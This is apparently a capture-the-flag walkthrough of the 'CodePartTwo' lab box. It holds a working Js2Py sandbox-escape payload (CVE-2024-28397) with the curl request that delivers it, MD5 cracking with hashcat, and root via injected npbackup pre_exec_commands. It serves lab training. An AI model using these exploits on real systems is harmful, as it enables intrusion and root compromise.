---
title: "CodePartTwo"
platform: "HTB"
difficulty: "Easy"
os: "Linux"
date: 2026-02-07
status: "rooted"
user_flag: true
root_flag: true
tags: [web, flask, js2py, cve, sandbox-escape, sqlite, hash-cracking, sudo-npbackup]
tools: [nmap, curl, python3, hashcat, sshpass, ssh, sqlite3]
ttl: "3h"
---

CodePartTwo is a Linux box running a Flask web app with a Js2Py JavaScript sandbox on port 8000. The attack chain starts with registering an account to access the code execution endpoint, escaping the Js2Py sandbox via CVE-2024-28397 to get RCE, extracting MD5 password hashes from a SQLite database, cracking them to SSH as a user, then abusing a sudo-allowed `npbackup-cli` binary with a malicious config to execute commands as root.

## Reconnaissance

### Port Scan

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
8000/tcp open  http    gunicorn (Flask)
```

Two ports — SSH and a non-standard HTTP on 8000. The web app is served by gunicorn, fronting a Flask application.

### Service Enumeration

Browsing `http://10.129.232.59:8000/` reveals a Flask app with login and registration pages. Examining the JavaScript source at `/static/js/script.js` exposes the available endpoints:

- `/register` — Account registration (form-encoded POST)
- `/login` — Authentication (form-encoded POST)
- `/run_code` — JavaScript code execution (JSON POST, requires auth)
- `/download` — File download

The `/run_code` endpoint accepts JavaScript and executes it through **Js2Py**, a JavaScript interpreter written in Python. This is immediately interesting — Js2Py has known sandbox escape vulnerabilities.

## Initial Foothold

### Account Registration

The app requires registration before accessing `/run_code`. Important detail: registration and login use **form-encoded** POST, while `/run_code` expects **JSON**.

```bash
# Register
curl -s -c /tmp/cj.txt http://10.129.232.59:8000/register \
  -d 'username=hacker&password=hacker123'

# Login (save session cookie)
curl -s -b /tmp/cj.txt -c /tmp/cj.txt http://10.129.232.59:8000/login \
  -d 'username=hacker&password=hacker123'
```

### Js2Py Sandbox Escape — CVE-2024-28397

**Vulnerability**: Js2Py allows access to Python internals through a type confusion. When JavaScript calls `Object.getOwnPropertyNames({})`, Js2Py returns a Python `dict_keys` object instead of a JavaScript array. This Python object is the bridge out of the sandbox.

The exploit chain:

```javascript
// Step 1: Get a Python object (dict_keys, not a JS array)
var p = Object.getOwnPropertyNames({});

// Step 2: Traverse Python's class hierarchy
var g = p.__getattribute__("__class__");
var b = g.__base__;
var s = b.__subclasses__();

// Step 3: Find subprocess.Popen (index 317 on this target)
var pp = s[317];

// Step 4: Execute command via positional args
var proc = pp.__call__("id", -1, null, null, -1, -1, null, true, true);
var out = proc.communicate();
out[0].decode("utf-8")
```

**Critical calling convention**: Popen must be called with **positional arguments** (`pp.__call__("cmd", -1, null, null, -1, -1, null, true, true)`). JavaScript objects like `{shell: true}` don't map to Python kwargs through Js2Py, so the keyword-argument style silently fails.

The Popen index (317) varies by environment. To find it, enumerate `__subclasses__()` and search for entries containing "Popen" or "subprocess".

Sending the exploit via the authenticated session:

```bash
curl -s -b /tmp/cj.txt http://10.129.232.59:8000/run_code \
  -H 'Content-Type: application/json' \
  -d '{"code": "var p=Object.getOwnPropertyNames({});var g=p.__getattribute__(\"__class__\");var b=g.__base__;var s=b.__subclasses__();var pp=s[317];var proc=pp.__call__(\"id\",-1,null,null,-1,-1,null,true,true);proc.communicate()[0].decode(\"utf-8\")"}'
```

Response: `uid=1000(app) gid=1000(app) groups=1000(app)` — RCE as the `app` user.

## Post-Exploitation

### Source Code Review

With RCE, reading the Flask app source at `/home/app/app/app.py` reveals:

- SQLite database at `/home/app/app/instance/database.db`
- Passwords stored as **unsalted MD5** hashes
- User model with username and password_hash fields

### SQLite Database Extraction

The cleanest approach avoids quoting issues with SELECT statements:

```bash
sqlite3 /home/app/app/instance/database.db .dump
```

This dumps the entire database, including the User table with MD5 hashes. Alternatively, Python avoids all quoting problems:

```bash
python3 -c "import sqlite3; c=sqlite3.connect('/home/app/app/instance/database.db'); print(c.execute('SELECT * FROM User').fetchall())"
```

The dump reveals user `marco` with an MD5 hash.

### Hash Cracking

```bash
echo '<marco_md5_hash>' > /tmp/marco.hash
hashcat -m 0 /tmp/marco.hash /usr/share/wordlists/rockyou.txt
hashcat -m 0 /tmp/marco.hash --show
```

Cracked password: **`sweetangelbabylove`**

### SSH as Marco

```bash
sshpass -p 'sweetangelbabylove' ssh -o StrictHostKeyChecking=no marco@10.129.232.59
```

### User Flag

```
2fc3168b81043ad27bfafe8684b15570
```

## Privilege Escalation

### sudo Enumeration

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

`npbackup-cli` is a Python wrapper for npbackup 3.0.1, a backup tool. The binary blocks the `--external-backend-binary` flag (which would allow direct command execution), but allows `-c` / `--config-file` to specify a custom config.

### npbackup Config Analysis

Reading the existing config at `/home/marco/npbackup.conf`:

```yaml
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: [encrypted]
    repo_password: [encrypted]
groups:
  default_group:
    backup_opts:
      paths:
        - /home/app/app/
      pre_exec_commands: []
      post_exec_commands: []
```

The **`pre_exec_commands`** field runs shell commands as root *before* the backup starts. Since `npbackup-cli` runs via sudo with NOPASSWD, any commands injected here execute as root.

### Crafting the Evil Config

The evil config must **preserve the original encrypted repo credentials**. Without valid `repo_uri` and `repo_password`, npbackup errors out before executing pre_exec_commands — a dummy repo URI won't work.

Using Python's `yaml` module to cleanly modify the config avoids all quoting and escaping issues:

```bash
python3 -c "
import yaml
conf = yaml.safe_load(open('/home/marco/npbackup.conf'))
conf['groups']['default_group']['backup_opts']['pre_exec_commands'] = [
    'cp /root/root.txt /tmp/root_flag.txt',
    'chmod 644 /tmp/root_flag.txt'
]
yaml.dump(conf, open('/home/marco/evil.conf', 'w'), default_flow_style=False)
"
```

### Triggering the Backup

```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/evil.conf -b
```

The pre_exec_commands fire as root, copying the flag to a world-readable location.

### Root Flag

```bash
cat /tmp/root_flag.txt
```

```
ed60716b9f78cadce1b12ce6b1f39c39
```

## Lessons Learned

### What Worked
- Recognizing the `dict_keys` error from `Object.getOwnPropertyNames({})` as the Js2Py type confusion — this error IS the vulnerability, not a failure
- Using `sqlite3 .dump` instead of quoted SELECT statements to avoid shell quoting nightmares
- Using `python3 + yaml.dump` to write the evil npbackup config — cleanly handles YAML structure without escaping issues
- Preserving the original encrypted repo credentials in the evil config — without them, npbackup exits before running pre_exec_commands

### What Failed
- Initial attempts to use `curl -d '{"code": ...}'` with nested JSON through certain shell environments — the quoting layers (shell → curl → JSON → JavaScript) collapse; Python `requests` or `curl @file` is more reliable
- Trying to read SSH keys or shadow files as the `app` user — insufficient permissions, had to pivot through hash cracking → SSH as marco
- Attempting to write YAML configs line-by-line via echo/redirect — use `yaml.dump` or heredocs instead

### Key Takeaways
- **Js2Py type confusion** is the core of CVE-2024-28397 — whenever a Python type leaks through a JavaScript boundary, you can traverse `__class__.__base__.__subclasses__()` to find dangerous classes like `subprocess.Popen`
- **Popen positional args through Js2Py** — JS objects don't become Python kwargs; you must pass all 9 positional arguments (`cmd, bufsize, stdin, stdout, stderr, preexec_fn, close_fds, shell, cwd`)
- **Backup tool configs are privesc gold** — any backup tool with pre/post-exec hooks and sudo access is exploitable; always read the config file and look for command execution fields
- **Unsalted MD5** is trivially crackable — hashcat handles it in seconds against rockyou
- **Non-standard ports matter** — always include `:8000` (or whatever port) in every URL; dropping it silently hits a different service or gets connection refused
